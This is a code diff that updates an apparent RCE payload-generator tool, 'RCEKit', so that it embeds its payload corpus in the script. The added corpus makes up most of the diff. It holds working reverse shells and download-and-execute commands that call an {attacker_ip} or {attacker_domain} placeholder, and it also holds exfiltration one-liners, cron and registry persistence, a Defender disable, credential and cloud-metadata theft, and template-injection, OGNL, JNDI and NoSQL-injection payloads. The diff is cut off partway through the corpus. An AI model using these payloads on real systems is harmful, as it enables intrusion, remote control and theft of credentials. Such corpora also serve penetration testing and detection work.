@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.20.1"
+__version__ = "2.21.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -71,7 +71,12 @@ class RCEKit:
     ):
         self.attacker_ip = attacker_ip
         self.attacker_domain = attacker_domain
+        # An explicit --template-file is authoritative: it never falls back to the
+        # built-in corpus, so "I pointed at my corpus" always means what it says.
+        self.template_explicit = template_path is not None
         self.template_path = template_path or Path(__file__).parent / "templates" / "payloads.json"
+        # Which corpus actually loaded, for --doctor and the fallback notice.
+        self.corpus_source: str = str(self.template_path)
         self.setup_components()
 
     def setup_components(self):
@@ -179,10 +184,17 @@ class RCEKit:
         ``self.template_error`` (``None`` on success) so callers can hard-fail
         on a missing or corrupt corpus instead of silently generating nothing.
 
+        Resolution order: an explicit ``--template-file`` wins; otherwise
+        ``templates/payloads.json`` beside the script wins; otherwise the corpus
+        embedded in this file is used, so a lone ``rcekit.py`` still runs.
+
         Templates are JSON only: RCEKit is standard-library-only (no third-party
         dependencies), and a YAML parser is not in the stdlib."""
         self.template_error: Optional[str] = None
         if not self.template_path.exists():
+            if not self.template_explicit:
+                self._load_embedded_payloads()
+                return
             message = f"template file not found: {self.template_path}"
             logger.warning("%s", message)
             self.payload_categories = {}
@@ -211,6 +223,34 @@ class RCEKit:
             self.detection_payloads = {}
             self.template_error = message
 
+    def _load_embedded_payloads(self) -> None:
+        """Fall back to the corpus embedded in this file.
+
+        Only reached when the default corpus file is absent — a lone rcekit.py on
+        a jump box, an air-gapped copy, a bare ``curl`` of the raw script. A file
+        that exists but fails to parse is still an error: falling back there would
+        mask a truncated or tampered corpus, which is the case the hard-fail was
+        written for.
+
+        Parsed lazily so the in-repo path never pays for it."""
+        self.corpus_source = "built-in (no templates/payloads.json beside the script)"
+        try:
+            data = json.loads(EMBEDDED_PAYLOAD_CORPUS)
+            self.payload_categories = data.get("payload_categories", {})
+            self.detection_payloads = data.get("detection_payloads", {})
+        except Exception as exc:  # pragma: no cover — a build-time guarantee
+            message = f"unable to parse the built-in payload corpus: {exc}"
+            logger.error("%s", message)
+            self.payload_categories = {}
+            self.detection_payloads = {}
+            self.template_error = message
+            return
+        logger.info("using the built-in payload corpus (%s not found)", self.template_path)
+
+    def uses_embedded_corpus(self) -> bool:
+        """Whether the run fell back to the corpus embedded in this file."""
+        return self.corpus_source.startswith("built-in")
+
     def _corpus_stats(self) -> Tuple[int, int, Set[str]]:
         """Return (exploit payload count, environment count, environments)."""
         total = 0
@@ -229,11 +269,11 @@ class RCEKit:
     def check_integrity(self) -> Tuple[bool, List[str]]:
         """Validate the loaded payload corpus for the ``--doctor`` health check.
         Returns ``(ok, report_lines)``."""
-        report = [f"template: {self.template_path}"]
+        report = [f"corpus: {self.corpus_source}"]
         if self.template_error:
             report.append(f"  [FAIL] {self.template_error}")
             return False, report
-        report.append("  [ok] file loaded and parsed")
+        report.append("  [ok] corpus loaded and parsed")
         total, env_count, _ = self._corpus_stats()
         detection_total = sum(len(v) for v in self.detection_payloads.values())
         report.append(f"  exploit categories: {len(self.payload_categories)}  "
@@ -3069,6 +3109,12 @@ def main():
     )
     generator.insecure = args.insecure
 
+    # Never silent: someone who thinks they are running an edited corpus must not
+    # discover only from the results that they were running the built-in one.
+    if generator.uses_embedded_corpus():
+        print(f"[i] Using the built-in payload corpus ({generator.template_path} not found). "
+              "Pass --template-file to use your own.")
+
     if args.doctor:
         ok, report = generator.check_integrity()
         print("[doctor] RCEKit corpus integrity check")
@@ -3422,6 +3468,629 @@ def main():
         return 1
 
     print(f"Generated {count} payloads to {args.output} in {mode} mode")
+
+# --- BEGIN EMBEDDED PAYLOAD CORPUS (generated by tools/embed_corpus.py) ---
+# Source: templates/payloads.json — edit that file, then re-run the script.
+EMBEDDED_PAYLOAD_CORPUS = r"""
+{
+    "payload_categories": {
+        "basic_enum": {
+            "unix": [
+                "id",
+                "whoami",
+                "uname -a",
+                "pwd",
+                "ls -la",
+                "ps aux",
+                "uptime",
+                "cat /etc/os-release",
+                "env",
+                "last -n 5",
+                "lsb_release -a 2>/dev/null"
+            ],
+            "windows": [
+                "whoami",
+                "ver",
+                "dir",
+                "tasklist",
+                "ipconfig",
+                "systeminfo",
+                "wmic os get Caption,CSDVersion,OSArchitecture,Version",
+                "set",
+                "query user",
+                "whoami /groups"
+            ]
+        },
+        "file_operations": {
+            "unix": [
+                "cat /etc/passwd",
+                "cat /etc/shadow",
+                "head -n 10 /etc/passwd",
+                "tail -f /var/log/syslog",
+                "find / -name '*.conf' -type f 2>/dev/null",
+                "ls -la /root 2>/dev/null",
+                "find /home -maxdepth 2 -type f -name '.ssh' 2>/dev/null",
+                "find / -perm -4000 -type f 2>/dev/null",
+                "getfacl -R /home 2>/dev/null",
+                "tar -cf /tmp/etc_backup.tar /etc 2>/dev/null"
+            ],
+            "windows": [
+                "type C:\\Windows\\System32\\drivers\\etc\\hosts",
+                "dir C:\\Windows\\System32\\drivers\\etc",
+                "dir C:\\Users",
+                "dir C:\\\\ProgramData",
+                "type C:\\\\Windows\\\\System32\\\\config\\\\SAM 2>nul",
+                "dir %USERPROFILE%\\\\Documents",
+                "type %USERPROFILE%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data 2>nul"
+            ]
+        },
+        "network_operations": {
+            "unix": [
+                "ifconfig",
+                "netstat -tulpn",
+                "arp -a",
+                "ping -c 4 127.0.0.1",
+                "ip addr",
+                "ss -tunlp",
+                "route -n",
+                "dig +short myip.opendns.com @resolver1.opendns.com"
+            ],
+            "windows": [
+                "ipconfig /all",
+                "netstat -ano",
+                "arp -a",
+                "ping -n 4 127.0.0.1",
+                "Get-NetIPConfiguration",
+                "route print",
+                "powershell -Command \"Resolve-DnsName {attacker_domain}\"",
+                "powershell -Command \"(Invoke-WebRequest -UseBasicParsing https://ifconfig.me).Content\""
+            ]
+        },
+        "code_execution": {
+            "nodejs": {
+                "child_process_exec": [
+                    "require('child_process').exec('whoami')",
+                    "require('child_process').exec('cat /etc/passwd | nc {attacker_ip} 443')",
+                    "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{attacker_ip}/443 0>&1\"')",
+                    "require('child_process').spawnSync('whoami').stdout.toString()",
+                    "process.mainModule.require('child_process').exec('id')"
+                ],
+                "pug_ssti": [
+                    "= 7 * 7",
+                    "= require('child_process').exec('whoami')",
+                    "= global.process.mainModule.require('child_process').exec('id')"
+                ],
+                "ejs_ssti": [
+                    "<%= 7 * 7 %>",
+                    "<%= require('child_process').exec('whoami') %>",
+                    "<%- global.process.mainModule.require('child_process').exec('id') %>"
+                ],
+                "handlebars_ssti": [
+                    "{{7 * 7}}",
+                    "{{ {math} }}",
+                    "{{lookup (lookup (lookup (lookup __proto__ 'constructor') 'constructor') 'call') 'whoami'}}",
+                    "{{#with (lookup (lookup this '__proto__') 'constructor')}}{{#with (lookup this 'constructor')}}{{call this 'cat /etc/passwd'}}{{/with}}{{/with}}"
+                ],
+                "vm_eval": [
+                    "(new (require('vm').Script)(`require('child_process').exec('whoami')`)).runInThisContext()",
+                    "vm.runInNewContext(`require('child_process').exec('curl http://{attacker_domain}/x.sh | sh')`, {}, { timeout: 1000 })",
+                    "require('vm').runInNewContext(`process.mainModule.require('child_process').exec('id')`)"
+                ],
+                "deserialization": [
+                    "const serialize = require('node-serialize'); const payload = \"{\\\"rce\\\": \\\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\\\"}\"; serialize.unserialize(payload);",
+                    "const payload = \"{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){process.mainModule.require('child_process').exec('id');}()\\\"}\"; require('node-serialize').unserialize(payload);"
+                ],
+                "expression_template": [
+                    "{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}",
+                    "={{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}",
+                    "{{ (function(){ return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd').toString() })() }}",
+                    "={{ $jmespath ? '' : (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}"
+                ]
+            },
+            "python": {
+                "os_system": [
+                    "os.system('whoami')",
+                    "os.system('cat /etc/passwd')",
+                    "os.system('bash -i >& /dev/tcp/{attacker_ip}/443 0>&1')",
+                    "__import__('os').system('id')",
+                    "os.popen('hostname').read()"
+                ],
+                "subprocess": [
+                    "subprocess.call(['whoami'], shell=True)",
+                    "subprocess.Popen('cat /etc/passwd', shell=True).communicate()",
+                    "subprocess.check_output('uname -a', shell=True)"
+                ],
+                "jinja2_ssti": [
+                    "{{7*7}}",
+                    "{{ {math} }}",
+                    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+                    "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
+                    "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
+                    "{{cycler.__init__.__globals__['os'].popen('whoami').read()}}",
+                    "{{''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh',shell=True,stdout=-1).communicate()}}"
+                ],
+                "exec_ast": [
+                    "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef _(): pass",
+                    "@exec(\"raise Exception(open('/etc/passwd').read())\")\ndef _(): pass",
+                    "def _(a=exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")): pass",
+                    "def _(a=exec(\"raise Exception(open('/etc/passwd').read())\")): pass",
+                    "def _(a=__import__('os').system('id')): pass"
+                ]
+            },
+            "postgres": {
+                "psql_meta_command": [
+                    "SELECT 1;\n\\! id\n",
+                    "SELECT 1;\n\\! cat /etc/passwd\n",
+                    {"payload": "SELECT 1;\r\\! id\r", "notes": ["CR (\\r) separates the meta-command so a newline-based validator (e.g. pgAdmin CVE-2025-13780) does not detect the \\! line"]},
+                    {"payload": "SELECT 1;\r\\! cat /etc/passwd\r", "notes": ["CR (\\r) meta-command bypass; psql still executes \\! after splitting on CR"]},
+                    {"payload": "SELECT 1;\r\\! bash -c 'id > /tmp/rcekit_{canary}'\r", "expected_channel": "response", "notes": ["blind sink: confirm out-of-band or via the written marker rather than the HTTP response"]},
+                    {"payload": "SELECT 1;\r\\! curl -s {callback}\r", "notes": ["blind async sink: {callback} is filled by the chain runner with the OOB listener URL; confirmation is the received callback, not the HTTP response"]},
+                    {"payload": "SELECT 1;\r\\! python3 -c 'import urllib.request;urllib.request.urlopen(\"{callback}\")'\r", "notes": ["blind async sink, curl-free OOB callback via python3; confirmed by the received callback"]}
+                ]
+            },
+            "php": {
+                "exec_system": [
+                    "system('whoami')",
+                    "exec('whoami')",
+                    "shell_exec('whoami')",
+                    "passthru('whoami')",
+                    "eval('system(\"whoami\")')",
+                    "preg_replace('/.*/e','system(\"whoami\")','')",
+                    "$output = shell_exec('whoami'); echo $output;",
+                    "system($_GET['cmd']);",
+                    "shell_exec('curl http://{attacker_domain}/payload.sh | sh');"
+                ],
+                "eval": [
+                    "assert(\"system('whoami')\");",
+                    "@create_function(\"\", \"system('ls');\");",
+                    "eval(base64_decode('c3lzdGVtKCd3aG9hbWknKTs='));"
+                ],
+                "deserialize": [
+                    "$payload = file_get_contents('php://input'); $object = unserialize($payload);",
+                    "$obj = unserialize($_POST['payload']); var_dump($obj);"
+                ]
+            },
+            "java": {
+                "runtime_exec": [
+                    "Runtime.getRuntime().exec(\"whoami\")",
+                    "new ProcessBuilder(\"whoami\").start()",
+                    "Runtime.getRuntime().exec(\"cat /etc/passwd\")",
+                    "Process process = new ProcessBuilder().command(\"bash\",\"-c\",\"id\").start();",
+                    "Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"cat /etc/passwd\"});"
+                ],
+                "freemarker_ssti": [
+                    "${7*7}",
+                    "${'freemarker.template.utility.Execute'?new()('id')}",
+                    "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id')}",
+                    "${'freemarker.template.utility.Execute'?new()('cat /etc/passwd')}"
+                ],
+                "velocity_ssti": [
+                    "#set($x='') $x",
+                    "#set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $d=$ex.getInputStream() $d=$chr.toChars($d.readBytes($d.available())) $out=$str.valueOf($d) $out",
+                    "#set($process=$x.class.forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')) $process"
+                ],
+                "thymeleaf_ssti": [
+                    "[[${7*7}]]",
+                    "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
+                    "[[${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}]]"
+                ],
+                "deserialization": [
+                    "new ObjectInputStream(new ByteArrayInputStream(payload)).readObject(); // ysoserial gadget",
+                    "new ObjectInputStream(new FileInputStream(\"payload.bin\")).readObject();"
+                ],
+                "expression": [
+                    "javax.script.ScriptEngineManager m = new javax.script.ScriptEngineManager(); m.getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('id')\");",
+                    "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('cat /etc/passwd')\");"
+                ],
+                "spel": [
+                    "T(java.lang.Runtime).getRuntime().exec(\"id\")",
+                    "new java.lang.ProcessBuilder(new String[]{\"bash\",\"-c\",\"id\"}).start()",
+                    "T(java.lang.Runtime).getRuntime().exec(new String[]{\"bash\",\"-c\",\"cat /etc/passwd\"})"
+                ],
+                "ognl": [
+                    "(#rt=@java.lang.Runtime@getRuntime()).exec(\"id\")",
+                    "%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(\"id\"))}",
+                    "(#cmd=\"id\").(#p=new java.lang.ProcessBuilder(#cmd)).(#p.start())"
+                ],
+                "groovy": [
+                    "\"id\".execute()",
+                    "[\"bash\",\"-c\",\"id\"].execute()",
+                    "Runtime.getRuntime().exec(\"id\")",
+                    "this.class.classLoader.parseClass(\"Runtime.getRuntime().exec('id')\").newInstance()"
+                ]
+            },
+            "dotnet": {
+                "process_start": [
+                    "Process.Start(\"whoami.exe\")",
+                    "Process.Start(\"cmd.exe\", \"/c whoami\")",
+                    "new Process { StartInfo = new ProcessStartInfo { FileName = \"cmd.exe\", Arguments = \"/c whoami\" } }.Start()",
+                    "Process.Start(new ProcessStartInfo(\"cmd.exe\"){Arguments=\"/c whoami\",UseShellExecute=false,RedirectStandardOutput=true});",
+                    "System.Diagnostics.Process.Start(\"powershell.exe\",\"-Command \\\"Get-Process\\\"\");"
+                ],
+                "deserialize": [
+                    "new BinaryFormatter().Deserialize(new MemoryStream(payload)); // Gadget execution",
+                    "new NetDataContractSerializer().Deserialize(new MemoryStream(payload));"
+                ]
+            },
+            "ruby": {
+                "kernel_system": [
+                    "system('whoami')",
+                    "`whoami`",
+                    "Kernel.system('whoami')",
+                    "Kernel.exec('whoami')",
+                    "IO.popen('id'){|io| io.read }",
+                    "%x(id)"
+                ],
+                "erb_ssti": [
+                    "<%= 7 * 7 %>",
+                    "<%= `whoami` %>",
+                    "<%= File.open('/etc/passwd').read %>",
+                    "<%= IO.popen('id'){|io| io.read } %>"
+                ]
+            },
+            "perl": {
+                "system_backticks": [
+                    "system('whoami')",
+                    "`whoami`",
+                    "exec('whoami')",
+                    "print `id`;",
+                    "open(my $fh, '-|', 'id'); while(<$fh>){print;}"
+                ]
+            },
+            "go": {
+                "os_exec": [
+                    "exec.Command(\"whoami\").Output()",
+                    "exec.Command(\"bash\", \"-c\", \"whoami\").Output()",
+                    "exec.Command(\"cat\", \"/etc/passwd\").Output()",
+                    "cmd := exec.Command(\"sh\",\"-c\",\"id\"); out, _ := cmd.CombinedOutput(); string(out)",
+                    "exec.Command(\"powershell\",\"-Command\",\"whoami\").Output()"
+                ]
+            }
+        },
+        "download_execute": {
+            "unix": [
+                "curl http://{attacker_domain}/shell.sh | sh",
+                "wget http://{attacker_domain}/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
+                "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://{attacker_domain}/shell.py').read())\"",
+                "perl -e 'use LWP::Simple; getstore(\"http://{attacker_domain}/shell\", \"/tmp/shell\"); system(\"/tmp/shell\");'",
+                "php -r \"$c=file_get_contents('http://{attacker_domain}/payload.php'); eval($c);\""
+            ],
+            "windows": [
+                "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{attacker_domain}/shell.ps1')\"",
+                "certutil -urlcache -f http://{attacker_domain}/shell.exe shell.exe && shell.exe",
+                "bitsadmin /transfer job /download /priority high http://{attacker_domain}/shell.exe shell.exe && shell.exe",
+                "powershell -c \"Invoke-WebRequest -Uri 'http://{attacker_domain}/shell.ps1' -OutFile $env:TEMP\\shell.ps1; . $env:TEMP\\shell.ps1\""
+            ]
+        },
+        "reverse_shells": {
+            "unix": [
+                "bash -i >& /dev/tcp/{attacker_ip}/443 0>&1",
+                "nc -e /bin/sh {attacker_ip} 443",
+                "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{attacker_ip}\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
+                "perl -e 'use Socket;$i=\"{attacker_ip}\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+                "php -r '$sock=fsockopen(\"{attacker_ip}\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            ],
+            "windows": [
+                "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()\"",
+                "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\"",
+                "cmd.exe /c powershell -Command \"$sm=(New-Object Net.Sockets.TCPClient('{attacker_ip}',443)).GetStream();$sw=New-Object IO.StreamWriter($sm);$sr=New-Object IO.StreamReader($sm);while(($cmd=$sr.ReadLine()) -ne $null){$send=(iex $cmd 2>&1 | Out-String);$sw.WriteLine($send);$sw.Flush()}\""
+            ]
+        },
+        "container_escape": {
+            "docker": [
+                "cat /proc/1/environ",
+                "nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh",
+                "cp /bin/sh /host/tmp/sh && chmod +s /host/tmp/sh",
+                "mount | grep overlay",
+                "docker run -v /:/host alpine chroot /host /bin/sh"
+            ],
+            "kubernetes": [
+                "kubectl get pods --namespace kube-system",
+                "kubectl run rce --image=alpine --restart=Never --command -- sh -c 'nc {attacker_ip} 443 -e /bin/sh'",
+                "kubectl exec -n kube-system kube-apiserver-0 -- cat /etc/kubernetes/admin.conf",
+                "kubectl auth can-i --list",
+                "kubectl get secrets -A"
+            ]
+        },
+        "credential_access": {
+            "unix": [
+                "grep -Ri 'password' /etc 2>/dev/null",
+                "ls -la ~/.ssh",
+                "cat ~/.ssh/id_rsa 2>/dev/null",
+                "find / -name 'id_rsa' -o -name '*.kdbx' 2>/dev/null",
+                "awk -F: '{ if ($2 != \"*\" && $2 != \"!\") print $1 }' /etc/shadow 2>/dev/null"
+            ],
+            "windows": [
+                "cmdkey /list",
+                "dir C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials",
+                "reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
+                "findstr /si password *.txt *.config *.ini",
+                "type %USERPROFILE%\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials\\\\* 2>nul"
+            ],
+            "php": [
+                "$config = include 'config.php'; var_dump($config);",
+                "echo file_get_contents(__DIR__ . '/.env');",
+                "echo file_get_contents('/var/www/html/config/database.php');"
+            ],
+            "python": [
+                "import os; print(os.environ.get('AWS_SECRET_ACCESS_KEY'))",
+                "from pathlib import Path; print(Path.home().joinpath('.aws','credentials').read_text())",
+                "import keyring; print(keyring.get_keyring())"
+            ]
+        },
+        "privilege_escalation": {
+            "unix": [
+                "sudo -l",
+                "cat /etc/sudoers",
+                "find / -perm -4000 -type f 2>/dev/null",
+                "getcap -r / 2>/dev/null",
+                "grep -R 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null"
+            ],
+            "windows": [
+                "whoami /priv",
+                "whoami /groups",
+                "icacls C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "wmic qfe get Caption,Description,HotFixID,InstalledOn",
+                "powershell -Command \"Get-Service | Where-Object {$_.Status -eq 'Running' -and $_.StartType -eq 'Auto'}\""
+            ],
+            "docker": [
+                "cat /proc/self/cgroup",
+                "ls -l /host 2>/dev/null",
+                "find / -maxdepth 2 -name docker.sock 2>/dev/null"
+            ],
+            "kubernetes": [
+                "kubectl auth can-i * *",
+                "kubectl describe clusterrolebinding",
+                "kubectl get pods -A -o wide"
+            ]
+        },
+        "persistence": {
+            "unix": [
+                "echo '@reboot /usr/bin/curl http://{attacker_domain}/shell.sh | sh' | crontab -",
+                "echo '*/5 * * * * /usr/bin/wget http://{attacker_domain}/payload.sh -O /tmp/payload.sh && sh /tmp/payload.sh' >> /etc/crontab",
+                "echo 'bash -i >& /dev/tcp/{attacker_ip}/443 0>&1' >> ~/.bashrc",
+                "mkdir -p ~/.config/systemd/user; echo -e '[Service]\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/{attacker_ip}/443 0>&1\"\n[Install]\nWantedBy=default.target' > ~/.config/systemd/user/update.service",
+                "echo '*/10 * * * * root /usr/bin/python3 -c \"import urllib.request; exec(urllib.request.urlopen(\\'http://{attacker_domain}/s.py\\').read())\"' >> /etc/cron.d/system"
+            ],
+            "windows": [
+                "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Updater /t REG_SZ /d C:\\\\Windows\\\\Temp\\\\backdoor.exe /f",
+                "schtasks /Create /SC ONLOGON /TN Updater /TR \\\"powershell.exe -ExecutionPolicy Bypass -File %TEMP%\\\\backdoor.ps1\\\" /F",
+                "powershell -Command \"New-ItemProperty -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Sync -Value 'powershell -nop -w hidden -c Invoke-WebRequest http://{attacker_domain}/sync.ps1 -OutFile $env:TEMP\\\\sync.ps1; & $env:TEMP\\\\sync.ps1'\"",
+                "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
+                "copy %SystemRoot%\\\\System32\\\\cmd.exe %APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\update.exe"
+            ]
+        },
+        "cloud_metadata": {
+            "unix": [
+                "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "wget -q -O- http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata:true'",
+                "aws sts get-caller-identity",
+                "curl http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+            ],
+            "windows": [
+                "powershell -Command \"Invoke-WebRequest -Headers @{'Metadata-Flavor'='Google'} -Uri http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\"",
+                "powershell -Command \"Invoke-RestMethod -Headers @{Metadata='true'} -Uri http://169.254.169.254/metadata/instance?api-version=2021-02-01\"",
+                "powershell -Command \"Invoke-WebRequest -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
+                "powershell -Command \"Invoke-RestMethod -Uri http://100.100.100.200/latest/meta-data/ram/security-credentials/\""
+            ],
+            "docker": [
+                "curl --connect-timeout 1 http://169.254.169.254/latest/meta-data/",
+                "ip route",
+                "nsenter --target 1 --mount --uts --ipc --net --pid curl http://169.254.169.254/latest/meta-data/"
+            ],
+            "kubernetes": [
+                "kubectl get secrets -n kube-system aws-auth -o yaml",
+                "curl -k -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' https://kubernetes.default.svc/api",
+                "kubectl get configmap -n kube-system cluster-info -o yaml"
+            ]
+        },
+        "database_enumeration": {
+            "unix": [
+                "mysql -e \"SHOW DATABASES;\"",
+                "psql -c \"SELECT table_schema,table_name FROM information_schema.tables LIMIT 10;\"",
+                "mongo --quiet --eval \"db.adminCommand({listDatabases:1})\"",
+                "sqlite3 /etc/passwd \"SELECT * FROM sqlite_master;\"",
+                "redis-cli INFO"
+            ],
+            "windows": [
+                "sqlcmd -Q \"SELECT name FROM sys.databases\"",
+                "powershell -Command \"Invoke-Sqlcmd -Query \"\"SELECT name FROM master..sysdatabases\"\"\"",
+                "wmic path win32_service get Name,PathName | findstr /i sql"
+            ],
+            "php": [
+                "$pdo = new PDO('mysql:host=127.0.0.1', 'root', ''); foreach($pdo->query('SHOW DATABASES') as $row){echo $row[0] . \"\\n\";}",
+                "echo mysqli_get_host_info(mysqli_connect('127.0.0.1', 'root', ''));",
+                "$db = new PDO('sqlite:/var/www/html/database.sqlite'); foreach($db->query('SELECT name FROM sqlite_master') as $row){echo $row['name'];}"
+            ],
+            "python": [
+                "import sqlite3; [print(row) for row in sqlite3.connect('app.db').execute(\"SELECT name FROM sqlite_master WHERE type='table'\")]",
+                "import pymongo; client = pymongo.MongoClient('mongodb://127.0.0.1:27017'); print(client.list_database_names())",
+                "import mysql.connector; conn = mysql.connector.connect(user='root',password='',host='127.0.0.1'); cursor = conn.cursor(); cursor.execute('SHOW DATABASES'); print(cursor.fetchall())"
+            ]
+        },
+        "lateral_movement": {
+            "unix": [
+                "ssh -oStrictHostKeyChecking=no user@{attacker_ip}",
+                "for host in $(cut -d' ' -f1 /etc/hosts); do ssh -oBatchMode=yes $host uptime; done",
+                "scp /etc/passwd {attacker_ip}:/tmp/passwd_copy",
+                "ansible all -i {attacker_ip}, -m shell -a 'whoami'",
+                "rsh {attacker_ip} whoami"
+            ],
+            "windows": [
+                "wmic /node:{attacker_ip} process call create 'cmd.exe /c whoami'",
+                "psexec \\\\{attacker_ip} cmd.exe /c whoami",
+                "winrs -r:{attacker_ip} cmd",
+                "powershell -Command \"Invoke-Command -ComputerName {attacker_ip} -ScriptBlock { whoami }\"",
+                "net use \\\\{attacker_ip}\\\\C$"
+            ]
+        },
+        "waf_bypass": {
+            "unix": [
+                "cat${IFS}/etc/passwd",
+                "cat$IFS/etc/passwd",
+                "cat${IFS%??}/etc/passwd",
+                "{cat,/etc/passwd}",
+                "cat</etc/passwd",
+                "who$@ami",
+                "uname${IFS}-a",
+                "i\\d"
+            ],
+            "windows": [
+                "who^ami",
+                "wh^o^ami",
+                "type%09C:\\Windows\\win.ini",
+                "cmd /c who^ami"
+            ]
+        },
+        "oob": {
+            "unix": [
+                "curl http://{oob}/",
+                "wget -qO- http://{oob}/",
+                "nslookup {oob}",
+                "ping -c 1 {oob}",
+                "dig {oob}",
+                "curl http://{oob}/$(whoami)",
+                "curl http://$(whoami).{oob}/"
+            ],
+            "windows": [
+                "nslookup {oob}",
+                "powershell -c \"Invoke-WebRequest -UseBasicParsing http://{oob}/\"",
+                "powershell -c \"Resolve-DnsName {oob}\"",
+                "certutil -urlcache -f http://{oob}/ %TEMP%\\x",
+                "cmd /c nslookup %USERNAME%.{oob}"
+            ],
+            "java": [
+                "${jndi:ldap://{oob}/a}",
+                "${jndi:dns://{oob}/a}",
+                "${jndi:rmi://{oob}/a}"
+            ]
+        },
+        "nosql_injection": {
+            "mongodb": {
+                "operator_injection": [
+                    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+                    "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+                    "{\"username\": \"admin\", \"password\": {\"$regex\": \"^.*\"}}",
+                    "username[$ne]=admin&password[$ne]=x",
+                    "{\"$or\": [{}, {\"x\": \"y\"}], \"username\": \"admin\"}"
+                ],
+                "where_js": [
+                    "{\"$where\": \"return true\"}",
+                    "{\"$where\": \"this.password == this.username\"}",
+                    "{\"$where\": \"sleep(5000)\"}",
+                    "admin' || '1'=='1",
+                    "'; return true; var x='"
+                ],
+                "server_side_js": [
+                    "{\"$expr\": {\"$function\": {\"body\": \"function(){return true}\", \"args\": [], \"lang\": \"js\"}}}",
+                    "{\"$expr\": {\"$function\": {\"body\": \"function(){return sleep(5000)}\", \"args\": [], \"lang\": \"js\"}}}",
